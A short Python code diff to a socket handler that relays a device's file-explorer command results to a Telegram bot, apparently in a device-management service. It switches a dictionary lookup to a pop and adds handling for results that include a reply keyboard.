@@ -1540,12 +1540,18 @@ def _sock_file_explorer(data):
     status = data.get("status", "?")
     logger.info(f"[Socket] استكشاف ملفات: #{dev.get('short_id', '?')} cmd={cmd} status={status}")
 
-    pending = _pending_cmds.get(request.sid)
+    # Use pop (not get) so stale entries don't linger
+    pending = _pending_cmds.pop(request.sid, None)
     if pending and mdm_bot:
         cid = pending["cid"]
         try:
-            text = _format_cmd_result(dev, cmd, status, data.get("data"), data.get("error"))
-            mdm_bot.bot.send_message(cid, text, parse_mode="HTML")
+            result = _format_cmd_result(dev, cmd, status, data.get("data"), data.get("error"))
+            # Handle both plain string and (text, keyboard) tuple results
+            if isinstance(result, tuple):
+                text, kb = result
+                mdm_bot.bot.send_message(cid, text, parse_mode="HTML", reply_markup=kb)
+            else:
+                mdm_bot.bot.send_message(cid, result, parse_mode="HTML")
         except Exception as e:
             logger.error(f"فشل إرسال نتائج file explorer: {e}")
 
